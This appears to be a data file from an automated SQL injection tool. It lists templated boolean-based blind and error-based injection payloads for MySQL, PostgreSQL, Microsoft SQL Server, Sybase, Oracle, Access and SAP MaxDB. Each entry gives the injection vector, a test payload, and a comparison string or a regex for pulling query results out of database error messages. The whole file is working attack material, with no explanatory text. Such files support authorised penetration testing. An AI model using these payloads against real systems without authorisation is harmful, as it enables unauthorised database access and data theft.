{"title": "PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)", "stype": 1, "level": 5, "risk": 1, "clause": [3], "where": [1], "vector": ",(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)", "request": {"payload": ",(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)"}, "response": {"comparison": ",(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)"}, "details": {"dbms": "PostgreSQL"}}
{"title": "Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause", "stype": 1, "level": 3, "risk": 1, "clause": [3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)", "stype": 1, "level": 4, "risk": 1, "clause": [3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Oracle boolean-based blind - ORDER BY, GROUP BY clause", "stype": 1, "level": 3, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)", "stype": 1, "level": 4, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "details": {"dbms": "Oracle"}}
{"title": "Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause", "stype": 1, "level": 4, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",IIF([INFERENCE],1,1/0)", "request": {"payload": ",IIF([RANDNUM]=[RANDNUM],1,1/0)"}, "response": {"comparison": ",IIF([RANDNUM]=[RANDNUM1],1,1/0)"}, "details": {"dbms": "Microsoft Access"}}
{"title": "Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)", "stype": 1, "level": 5, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",IIF([INFERENCE],[ORIGVALUE],1/0)", "request": {"payload": ",IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)"}, "response": {"comparison": ",IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)"}, "details": {"dbms": "Microsoft Access"}}
{"title": "SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause", "stype": 1, "level": 4, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(CASE WHEN [INFERENCE] THEN 1 ELSE NULL END)", "request": {"payload": ",(CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END)"}, "response": {"comparison": ",(CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END)"}, "details": {"dbms": "SAP MaxDB"}}
{"title": "SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)", "stype": 1, "level": 5, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)", "request": {"payload": ",(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)"}, "response": {"comparison": ",(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)"}, "details": {"dbms": "SAP MaxDB"}}
{"title": "HAVING boolean-based blind - WHERE, GROUP BY clause", "stype": 1, "level": 3, "risk": 1, "clause": [1, 2], "where": [1], "vector": "HAVING [INFERENCE]", "request": {"payload": "HAVING [RANDNUM]=[RANDNUM]"}, "response": {"comparison": "HAVING [RANDNUM]=[RANDNUM1]"}}
{"title": "MySQL >= 5.0 boolean-based blind - Stacked queries", "stype": 1, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)", "request": {"payload": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)", "comment": "#"}, "response": {"comparison": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}
{"title": "MySQL < 5.0 boolean-based blind - Stacked queries", "stype": 1, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)", "request": {"payload": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)", "comment": "#"}, "response": {"comparison": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)"}, "details": {"dbms": "MySQL", "dbms_version": "< 5.0"}}
{"title": "PostgreSQL boolean-based blind - Stacked queries", "stype": 1, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)", "request": {"payload": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)", "comment": "--"}, "response": {"comparison": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)", "stype": 1, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1", "request": {"payload": ";SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1", "comment": "--"}, "response": {"comparison": ";SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1"}, "details": {"dbms": "PostgreSQL"}}
{"title": "Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)", "stype": 1, "level": 3, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]", "request": {"payload": ";IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]", "comment": "--"}, "response": {"comparison": ";IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase boolean-based blind - Stacked queries", "stype": 1, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)", "request": {"payload": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)", "comment": "--"}, "response": {"comparison": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Oracle boolean-based blind - Stacked queries", "stype": 1, "level": 4, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL", "request": {"payload": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL", "comment": "--"}, "response": {"comparison": ";SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL"}, "details": {"dbms": "Oracle"}}
{"title": "Microsoft Access boolean-based blind - Stacked queries", "stype": 1, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";IIF([INFERENCE],1,1/0)", "request": {"payload": ";IIF([RANDNUM]=[RANDNUM],1,1/0)", "comment": "%16"}, "response": {"comparison": ";IIF([RANDNUM]=[RANDNUM1],1,1/0)"}, "details": {"dbms": "Microsoft Access"}}
{"title": "SAP MaxDB boolean-based blind - Stacked queries", "stype": 1, "level": 5, "risk": 1, "clause": [1, 2, 3, 4, 5, 6, 7, 8], "where": [1], "vector": ";SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END", "request": {"payload": ";SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END", "comment": "--"}, "response": {"comparison": ";SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END"}, "details": {"dbms": "SAP MaxDB"}}
{"title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)", "stype": 2, "level": 4, "risk": 1, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", "request": {"payload": "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}
{"title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)", "stype": 2, "level": 4, "risk": 3, "clause": [1, 8, 9], "where": [1], "vector": "OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", "request": {"payload": "OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}
{"title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)", "stype": 2, "level": 4, "risk": 1, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))", "request": {"payload": "AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}
{"title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)", "stype": 2, "level": 4, "risk": 3, "clause": [1, 8, 9], "where": [1], "vector": "OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))", "request": {"payload": "OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}
{"title": "MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)", "stype": 2, "level": 5, "risk": 1, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))", "request": {"payload": "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.7.8"}}
{"title": "MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)", "stype": 2, "level": 5, "risk": 3, "clause": [1, 8, 9], "where": [1], "vector": "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))", "request": {"payload": "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.7.8"}}
{"title": "MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)", "stype": 2, "level": 1, "risk": 1, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)", "request": {"payload": "AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}
{"title": "MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)", "stype": 2, "level": 1, "risk": 3, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)", "request": {"payload": "OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}
{"title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)", "stype": 2, "level": 2, "risk": 1, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", "request": {"payload": "AND EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}
{"title": "MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)", "stype": 2, "level": 2, "risk": 3, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "OR EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", "request": {"payload": "OR EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}
{"title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)", "stype": 2, "level": 3, "risk": 1, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])", "request": {"payload": "AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}
{"title": "MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)", "stype": 2, "level": 3, "risk": 3, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])", "request": {"payload": "OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}
{"title": "MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)", "stype": 2, "level": 2, "risk": 1, "clause": [1, 2, 3, 8, 9], "where": [1], "vector": "AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)", "request": {"payload": "AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 4.1"}}
{"title": "MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)", "stype": 2, "level": 2, "risk": 3, "clause": [1, 8, 9], "where": [1], "vector": "OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)", "request": {"payload": "OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL", "dbms_version": ">= 4.1"}}
{"title": "MySQL OR error-based - WHERE or HAVING clause (FLOOR)", "stype": 2, "level": 3, "risk": 3, "clause": [1, 8, 9], "where": [2], "vector": "OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)", "request": {"payload": "OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)", "comment": "#"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "MySQL"}}
{"title": "PostgreSQL AND error-based - WHERE or HAVING clause", "stype": 2, "level": 1, "risk": 1, "clause": [1, 8, 9], "where": [1], "vector": "AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)", "request": {"payload": "AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL OR error-based - WHERE or HAVING clause", "stype": 2, "level": 1, "risk": 3, "clause": [1, 8, 9], "where": [2], "vector": "OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)", "request": {"payload": "OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": "PostgreSQL"}}
{"title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)", "stype": 2, "level": 1, "risk": 1, "clause": [1, 8, 9], "where": [1], "vector": "AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", "request": {"payload": "AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)", "stype": 2, "level": 2, "risk": 3, "clause": [1, 8, 9], "where": [2], "vector": "OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", "request": {"payload": "OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)", "stype": 2, "level": 2, "risk": 1, "clause": [1, 8, 9], "where": [1], "vector": "AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", "request": {"payload": "AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)", "stype": 2, "level": 3, "risk": 3, "clause": [1, 8, 9], "where": [2], "vector": "OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", "request": {"payload": "OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)", "stype": 2, "level": 2, "risk": 1, "clause": [1, 8, 9], "where": [1], "vector": "AND [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')", "request": {"payload": "AND [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)", "stype": 2, "level": 3, "risk": 3, "clause": [1, 8, 9], "where": [2], "vector": "OR [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')", "request": {"payload": "OR [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
